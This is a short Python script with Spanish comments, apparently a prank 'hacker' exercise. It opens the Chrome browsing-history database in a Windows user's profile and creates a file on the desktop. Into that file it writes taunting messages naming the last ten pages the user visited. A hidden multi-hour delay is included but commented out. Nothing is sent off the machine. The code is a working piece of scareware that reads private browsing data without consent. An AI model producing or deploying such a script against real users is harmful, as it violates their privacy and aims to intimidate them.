import os
from pathlib import Path
from random import randrange
from time import sleep
import sqlite3

HACKER_FILE_NAME = "Pruebameeee.txt"



def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    hours_g = randrange(7200,10800)#Generador de segundos
    #-------------------------------------Se convierten de seg a horas para que el usuario pueda ver la correcta conversión
    print("Durmiendo {} horas ".format((hours_g/60)/60.))
    sleep(hours_g) 


def create_hacker_file(user_path):
    hacker_file = open(user_path + "OneDrive/Escritorio/" + HACKER_FILE_NAME,"w") 
    hacker_file.write("Traviesillo heee 7u7\n\n")
    print("se ha creado el archivo con exito")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
            connecting = sqlite3.connect(history_path)
            cursor = connecting.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY  last_visit_time DESC")
            urls = cursor.fetchall()
            print("las urls se han obtenido")
            connecting.close() 
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos")
            sleep(3)


def check_history_and_write(hacker_file,chrome_history):
    for items in chrome_history [:10]:
        hacker_file.write("He visto que has visitado la web de {}, interesante...\n".format(items[0]))


def main():

    ####delay_action()   
    # Calculamos la rusta del usuario de windows    
    user_path = get_user_path()
    #Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)  
    #Recojemos el historial de google chrome, mientras este se pueda
    chrome_history= get_chrome_history(user_path)
    #Excribiendo mensajes de miedo
    check_history_and_write(hacker_file,chrome_history)
    

if __name__ == "__main__":
    main()
